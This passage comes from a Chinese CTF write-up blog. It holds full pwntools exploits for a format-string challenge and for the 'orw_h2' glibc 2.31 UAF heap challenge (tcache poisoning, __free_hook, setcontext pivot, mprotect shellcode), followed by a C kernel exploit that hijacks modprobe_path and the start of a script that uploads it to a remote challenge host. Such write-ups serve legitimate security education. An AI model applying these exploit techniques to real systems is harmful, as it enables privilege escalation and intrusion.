class=\"string\">constraints:</span></span><br><span class=\"line\"><span class=\"string\">  [rsp+0x30] == NULL</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">0xcd0f3 execve(&quot;/bin/sh&quot;, rcx, r12)</span></span><br><span class=\"line\"><span class=\"string\">constraints:</span></span><br><span class=\"line\"><span class=\"string\">  [rcx] == NULL || rcx == NULL</span></span><br><span class=\"line\"><span class=\"string\">  [r12] == NULL || r12 == NULL</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">0xcd1c8 execve(&quot;/bin/sh&quot;, rax, r12)</span></span><br><span class=\"line\"><span class=\"string\">constraints:</span></span><br><span class=\"line\"><span class=\"string\">  [rax] == NULL || rax == NULL</span></span><br><span class=\"line\"><span class=\"string\">  [r12] == NULL || r12 == NULL</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class=\"line\"><span class=\"string\">constraints:</span></span><br><span class=\"line\"><span class=\"string\">  [rsp+0x50] == NULL</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">0xf02b0 execve(&quot;/bin/sh&quot;, rsi, [rax])</span></span><br><span class=\"line\"><span class=\"string\">constraints:</span></span><br><span class=\"line\"><span class=\"string\">  [rsi] == NULL || rsi == NULL</span></span><br><span class=\"line\"><span class=\"string\">  [[rax]] == NULL || [rax] == NULL</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class=\"line\"><span class=\"string\">constraints:</span></span><br><span class=\"line\"><span class=\"string\">  [rsp+0x70] == NULL</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">0xf66f0 execve(&quot;/bin/sh&quot;, rcx, [rbp-0xf8])</span></span><br><span class=\"line\"><span class=\"string\">constraints:</span></span><br><span class=\"line\"><span class=\"string\">  [rcx] == NULL || rcx == NULL</span></span><br><span class=\"line\"><span class=\"string\">  [[rbp-0xf8]] == NULL || [rbp-0xf8] == NULL</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">ones = [libc_base + <span class=\"built_in\">int</span>(i,<span class=\"number\">16</span>) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> re.findall(<span class=\"string\">r&#x27;\\n(.+?) execve&#x27;</span>,og)]</span><br><span class=\"line\"><span class=\"comment\"># sl((fmtstr_payload(8,&#123;(elf.got[&#x27;printf&#x27;]):system_addr,(0x600A78):0x400640&#125;)).ljust(0x100,&#x27;\\0&#x27;))</span></span><br><span class=\"line\">sea(<span class=\"string\">&#x27;Say something.\\n&#x27;</span>,(fmtstr_payload(<span class=\"number\">8</span>,&#123;(elf.got[<span class=\"string\">&#x27;printf&#x27;</span>]):system_addr,(<span class=\"number\">0x600A78</span>):<span class=\"number\">0x400640</span>&#125;)).ljust(<span class=\"number\">0x100</span>,<span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\"><span class=\"comment\"># flag&#123;9cc94030040c64f2122706df577d15ee&#125;</span></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444669/Typera/2023/04/d26beea959cbaa17cbecb1d5b70d5514.png\" alt=\"image-20220608114145159\" /></p>\n<h3 id=\"orw_h2\"><a class=\"anchor\" href=\"#orw_h2\">#</a> orw_h2</h3>\n<p>libc 2.31 下的经典菜单堆题。</p>\n<p>漏洞很简单，free 掉堆块的时候没有清空指针，是一个很直接的 <strong>UAF</strong>：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444667/Typera/2023/04/57e330134d62778bbe29225751d63f8d.png\" alt=\"image-20220608113201143\" /></p>\n<p>思路：</p>\n<ol>\n<li>基本堆布局，利用 Largebin 残留指针 leak 出 libc 基址和堆基址。</li>\n<li>利用 Tcache Poisoning 构造一次任意分配堆块到 __free_hook 写  <code>rdx,QWORD PTR [rdi+0x8];mov QWORD PTR [rsp],rax;call   QWORD PTR [rdx+0x20]</code>  这个 gadget 的地址。</li>\n<li>利用写入的 gadget  配合 setcontext 构造栈迁移，改堆块为 rwx 权限，读入 shellcode 执行 shellcode 拿 flag。或者非常确定 flag 的文件名和路径的情况下，拿 orw 链子直接读 flag 也是可以的。</li>\n</ol>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python2</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">se      = <span class=\"keyword\">lambda</span> data               :p.send(data) </span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class=\"line\">sea     = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">rc      = <span class=\"keyword\">lambda</span> numb=<span class=\"number\">4096</span>          :p.recv(numb)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>, <span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">lg = <span class=\"keyword\">lambda</span> name,data : p.success(name + <span class=\"string\">&#x27;: \\033[1;36m 0x%x \\033[0m&#x27;</span> % data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\"><span class=\"built_in\">breakpoint</span>=<span class=\"string\">&#x27;&#x27;</span></span>):</span><br><span class=\"line\">    glibc_dir = <span class=\"string\">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span></span><br><span class=\"line\">    gdbscript = <span class=\"string\">&#x27;directory %smalloc/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;directory %sstdio-common/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;directory %sstdlib/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;directory %slibio/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    elf_base = <span class=\"built_in\">int</span>(os.popen(<span class=\"string\">&#x27;pmap &#123;&#125;| awk \\x27&#123;&#123;print \\x241&#125;&#125;\\x27&#x27;</span>.<span class=\"built_in\">format</span>(p.pid)).readlines()[<span class=\"number\">1</span>], <span class=\"number\">16</span>) <span class=\"keyword\">if</span> elf.pie <span class=\"keyword\">else</span> <span class=\"number\">0</span></span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;b *&#123;:#x&#125;\\n&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">int</span>(<span class=\"built_in\">breakpoint</span>) + elf_base) <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(<span class=\"built_in\">breakpoint</span>, <span class=\"built_in\">int</span>) <span class=\"keyword\">else</span> <span class=\"built_in\">breakpoint</span></span><br><span class=\"line\">    gdb.attach(p, gdbscript)</span><br><span class=\"line\">    time.sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./orw_h2&#x27;</span>)</span><br><span class=\"line\">context(arch = elf.arch, os = <span class=\"string\">&#x27;linux&#x27;</span>,log_level = <span class=\"string\">&#x27;debug&#x27;</span>,terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-hp&#x27;</span>,<span class=\"string\">&#x27;62&#x27;</span>])</span><br><span class=\"line\"><span class=\"comment\"># p = process(&#x27;./orw_h2&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;101.133.134.12&#x27;</span>,<span class=\"number\">10001</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">menu</span>(<span class=\"params\">choice</span>):</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;&gt;&gt; &#x27;</span>,<span class=\"built_in\">str</span>(choice))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,data=<span class=\"string\">&#x27;u&#x27;</span></span>):</span><br><span class=\"line\">    menu(<span class=\"number\">1</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Length of game description:&#x27;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    sea(<span class=\"string\">&#x27;Game description:&#x27;</span>,<span class=\"built_in\">str</span>(data))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dele</span>(<span class=\"params\"><span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">    menu(<span class=\"number\">2</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;game index: &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\"><span class=\"built_in\">id</span>,data</span>):</span><br><span class=\"line\">    menu(<span class=\"number\">3</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;game index: &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\">    sea(<span class=\"string\">&#x27;Edit Game description:&#x27;</span>,<span class=\"built_in\">str</span>(data))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\"><span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">    menu(<span class=\"number\">4</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;game index: &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x420</span>) <span class=\"comment\"># 0 </span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\">dele(<span class=\"number\">0</span>)</span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">libc_leak = uu64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[-<span class=\"number\">6</span>:])</span><br><span class=\"line\">libc_base = libc_leak - <span class=\"number\">0x1ecbe0</span></span><br><span class=\"line\">lg(<span class=\"string\">&#x27;libc_leak&#x27;</span>,libc_leak)</span><br><span class=\"line\">lg(<span class=\"string\">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class=\"line\">libc = elf.libc</span><br><span class=\"line\">libc.address = libc_base</span><br><span class=\"line\">system_addr = libc.sym.system</span><br><span class=\"line\">bin_sh = libc.search(<span class=\"string\">&#x27;/bin/sh&#x27;</span>).<span class=\"built_in\">next</span>()</span><br><span class=\"line\">magic = libc_base + <span class=\"number\">0x1518b0</span> <span class=\"comment\"># mov    rdx,QWORD PTR [rdi+0x8];mov QWORD PTR [rsp],rax;call   QWORD PTR [rdx+0x20]</span></span><br><span class=\"line\">rdi = libc_base + <span class=\"number\">0x0000000000023b72</span></span><br><span class=\"line\">rsi = libc_base + <span class=\"number\">0x000000000002604f</span></span><br><span class=\"line\">rdx_r12 = libc_base + <span class=\"number\">0x0000000000119241</span></span><br><span class=\"line\">ret = libc_base + <span class=\"number\">0x0000000000022679</span></span><br><span class=\"line\">rax = libc_base + <span class=\"number\">0x0000000000047400</span></span><br><span class=\"line\">jmp_rsi = libc_base + <span class=\"number\">0x000000000010d60d</span></span><br><span class=\"line\">read_addr = libc.sym.read</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000047400 : pop rax ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000023b72 : pop rdi ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000119241 : pop rdx ; pop r12 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000015f7e6 : pop rdx ; pop rbx ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000001025ad : pop rdx ; pop rcx ; pop rbx ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000024920 : pop rsi ; pop r15 ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000023b70 : pop rsi ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000002604f : pop rsi ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000133fe6 : pop rsi ; ret 0xb</span></span><br><span class=\"line\"><span class=\"string\">0x000000000002491c : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000023b6c : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000002604b : pop rsp ; pop r13 ; pop r14 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000ef1c5 : pop rsp ; pop r13 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000460a5 : pop rsp ; pop r13 ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000025bcc : pop rsp ; pop r13 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000008e261 : pop rsp ; pop r14 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000012cfae : pop rsp ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000002f73a : pop rsp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000099050 : pop rsp ; ret 0xffff</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000022679 : ret</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># orw = flat([</span></span><br><span class=\"line\"><span class=\"comment\">#     rax,2,rdi,heap_base+0x290+0x10,rsi,0,syscall_ret,rdi,3,rdx_r12,0x100,0,rsi,heap_base+0x290+0x20,read_addr,rdi,1,write_addr</span></span><br><span class=\"line\"><span class=\"comment\"># ])</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x430</span>) <span class=\"comment\"># 2</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"string\">&#x27;u&#x27;</span>*<span class=\"number\">0x10</span>)</span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&#x27;u&#x27;</span>*<span class=\"number\">0x10</span>)</span><br><span class=\"line\">heap_leak = uu64(rc(<span class=\"number\">6</span>))</span><br><span class=\"line\">heap_base = heap_leak - <span class=\"number\">0x290</span></span><br><span class=\"line\">lg(<span class=\"string\">&#x27;heap_leak&#x27;</span>,heap_leak)</span><br><span class=\"line\">lg(<span class=\"string\">&#x27;heap_base&#x27;</span>,heap_base)</span><br><span class=\"line\"></span><br><span class=\"line\">mmp = flat([</span><br><span class=\"line\">    rdi,((heap_base + <span class=\"number\">0xD00</span>)&gt;&gt;<span class=\"number\">12</span>)&lt;&lt;<span class=\"number\">12</span>,rsi,<span class=\"number\">0x2000</span>,rdx_r12,<span class=\"number\">7</span>,<span class=\"number\">0</span>,libc.sym.mprotect,rdi,<span class=\"number\">0</span>,rsi,heap_base + <span class=\"number\">0xD00</span>,rdx_r12,<span class=\"number\">0x1000</span>,<span class=\"number\">0</span>,read_addr,jmp_rsi</span><br><span class=\"line\">])</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,p64(libc_base+<span class=\"number\">0x1ecfd0</span>)*<span class=\"number\">2</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x420</span>) <span class=\"comment\"># 3 0</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>) <span class=\"comment\"># 4</span></span><br><span class=\"line\">dele(<span class=\"number\">1</span>)</span><br><span class=\"line\">dele(<span class=\"number\">4</span>)</span><br><span class=\"line\">edit(<span class=\"number\">4</span>,p64(libc.sym.__free_hook))</span><br><span class=\"line\">add(<span class=\"number\">0x20</span>) <span class=\"comment\"># 5</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,p64(magic)) <span class=\"comment\"># 6</span></span><br><span class=\"line\"></span><br><span class=\"line\">fuck = SigreturnFrame()</span><br><span class=\"line\">fuck.rsp = heap_base + <span class=\"number\">0x700</span></span><br><span class=\"line\">fuck.rip = ret</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,p64(<span class=\"number\">0</span>) + p64(heap_base + <span class=\"number\">0x290</span>+<span class=\"number\">0x10</span>) + p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span> + p64(libc.sym.setcontext+<span class=\"number\">61</span>)+<span class=\"built_in\">str</span>(fuck)[<span class=\"number\">0x28</span>:])<span class=\"comment\"># mov rdx,QWORD PTR [rdi+0x8];mov QWORD PTR [rsp],rax;call   QWORD PTR [rdx+0x20]</span></span><br><span class=\"line\">edit(<span class=\"number\">2</span>,mmp)</span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">0</span>)</span><br><span class=\"line\">sl(asm(shellcraft.cat(<span class=\"string\">&#x27;/flag&#x27;</span>)))</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"kernel\"><a class=\"anchor\" href=\"#kernel\">#</a> Kernel</h3>\n<p>简单的 kernel 题，给了任意地址写。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444667/Typera/2023/04/b7beb5832ebd13347106f73a5efab408.png\" alt=\"image-20220608114038284\" /></p>\n<p>那么劫持 <strong>modprobe_path</strong> 为我们自己的恶意 sh 文件路径，复制文件更改权限，就可以读 flag。</p>\n<p>用来读 flag 的 exp 源码：</p>\n<p><strong>exp.c</strong></p>\n<p><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">size_t</span> path = <span class=\"number\">0xffffffff81e48240</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> ** argv)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> fd1 = open(<span class=\"string\">&quot;/dev/chardev0&quot;</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(fd1 &lt;<span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[31m\\033[1m[x] Failed to open the babydev1!\\033[0m\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// ffffffff81e48240 D modprobe_path</span></span><br><span class=\"line\">    <span class=\"comment\">// ffffffffc0000000 t chardev_ioctl        [www]</span></span><br><span class=\"line\">    <span class=\"comment\">// 0xffffffffc000001e</span></span><br><span class=\"line\">    <span class=\"type\">size_t</span> ar[<span class=\"number\">2</span>] = &#123;path,<span class=\"number\">0x612f706d742f</span>&#125;;</span><br><span class=\"line\">    ioctl(fd1,<span class=\"number\">0x80084700</span>,ar);</span><br><span class=\"line\">    </span><br><span class=\"line\">    system(<span class=\"string\">&quot;echo -ne &#x27;#!/bin/sh\\n/bin/cp /flag /tmp/flag\\n/bin/chmod 777 /tmp/flag&#x27; &gt; /tmp/a&quot;</span>);</span><br><span class=\"line\">    system(<span class=\"string\">&quot;chmod +x /tmp/a&quot;</span>);</span><br><span class=\"line\">    system(<span class=\"string\">&quot;echo -ne &#x27;\\\\xff\\\\xff\\\\xff\\\\xff&#x27; &gt; /tmp/uuu&quot;</span>);</span><br><span class=\"line\">    system(<span class=\"string\">&quot;chmod +x /tmp/uuu&quot;</span>);</span><br><span class=\"line\">    system(<span class=\"string\">&quot;/tmp/uuu&quot;</span>);</span><br><span class=\"line\">    system(<span class=\"string\">&quot;cat /tmp/flag&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>编译脚本：</strong></p>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">musl-gcc exp.c -static -O2 -o exp <span class=\"comment\"># 这里用了 musl 编译缩小 exp 大小</span></span><br><span class=\"line\">strip exp</span><br></pre></td></tr></table></figure></p>\n<p><strong>用来上传 exp 的脚本：</strong></p>\n<p><strong><span class=\"exturl\" data-url=\"aHR0cDovL2NjLnB5\">cc.py</span></strong></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> time, os</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;101.133.134.12&#x27;</span>,<span class=\"number\">10002</span>)</span><br><span class=\"line\">os.system(<span class=\"string\">&quot;tar -czvf exp.tar.gz ./exp&quot;</span>)</span><br><span class=\"line\">os.system(<span class=\"string\">&quot;base64 exp.tar.gz &gt; b64_exp&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">f = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;./b64_exp&quot;</span>, <span class=\"string\">&quot;r&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline()</span><br><span 